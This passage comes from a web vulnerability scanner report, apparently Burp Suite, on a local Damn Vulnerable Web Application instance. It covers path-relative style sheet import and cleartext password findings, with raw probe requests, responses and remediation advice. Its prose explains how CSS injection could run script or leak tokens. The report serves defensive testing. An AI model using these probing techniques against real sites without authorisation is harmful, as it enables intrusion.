<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/index.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=l7kito9k4o0pae0g77911r7tf1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/login.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:50 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 6421<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/index.php<span class="HIGHLIGHT">/oo0nca/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=c1bh34pjj2os9qrasv43a96j51<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/login.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:41:39 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 6421<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/index.php/oo0nca/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=tl8gvp1u822ej52di1dnjkopg0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/login.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:41:40 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 6421<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/t<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="12">12.&nbsp;http://localhost:7878/dvwa/instructions.php</span>
<br><a class="PREVNEXT" href="#11">Previous</a>
&nbsp;<a class="PREVNEXT" href="#13">Next</a>
<br>
<span class="BODH1" id="12.1">12.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#11.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#13.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/instructions.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/instructions.php?doc=PHPIDS-license HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=fag7kdpaeegurn3nfh7bfdp9n4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/about.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:48 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br>Content-Length: 10965<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Instructions :: Damn Vulnerable Web Application (DVWA) v1.10 *Developmen<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/instructions.php<span class="HIGHLIGHT">/denvzo/</span>?doc=PHPIDS-license HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=fag7kdpaeegurn3nfh7bfdp9n4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/about.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:09 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br>Content-Length: 10965<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Instructions :: Damn Vulnerable Web Application (DVWA) v1.10 *Developmen<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/instructions.php/denvzo/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=fag7kdpaeegurn3nfh7bfdp9n4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/about.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:09 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br>Content-Length: 22529<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Instructions :: Damn Vulnerable Web Application (DVWA) v1.10 *Developmen<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="13">13.&nbsp;http://localhost:7878/dvwa/login.php</span>
<br><a class="PREVNEXT" href="#12">Previous</a>
&nbsp;<a class="PREVNEXT" href="#14">Next</a>
<br>
<span class="BODH1" id="13.1">13.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00300100_cleartextsubmissionofpassword">Cleartext submission of password</a></span>
<br><a class="PREVNEXT" href="#12.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#13.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/login.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://localhost:7878/dvwa/login.php</li></ul>The form contains the following password field:<ul><li>password</li></ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/117.html">CAPEC-117: Interception</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/login.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=lub2ldtl1n19g18t95thn5uipg<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:03:43 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1415<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Developm<br><b>...[SNIP]...</b><br>&lt;div id="content"&gt;<br><br> &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;form action="login.php" method="post"&gt;</span><br><br> &nbsp;&nbsp;&nbsp;&lt;fieldset&gt;<br><b>...[SNIP]...</b><br>&lt;/label&gt; <span class="HIGHLIGHT">&lt;input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="13.2">13.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#13.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#13.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/login.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/login.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=ppgkub5qu361866a8et07k13j5<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:03:43 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1415<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Developm<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/login.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp;&lt;/head&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
